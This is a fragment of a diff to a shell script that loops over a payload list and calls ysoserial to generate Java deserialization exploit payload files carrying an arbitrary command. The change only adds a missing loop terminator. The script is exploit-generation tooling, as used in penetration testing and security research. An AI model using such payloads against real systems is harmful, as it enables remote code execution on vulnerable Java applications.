@@ -139,7 +139,7 @@ for payload in $PAYLOAD_LIST;do
     filename="data/${payload}.bin"
     echo "-- Generating payload file $filename"
     java -jar ysoserial.jar $payload "$command"> "$filename"
-
+done
 
 # Show the payloads for Commons Collections (often reliable)
 $ ls CommonsCollections*.bin
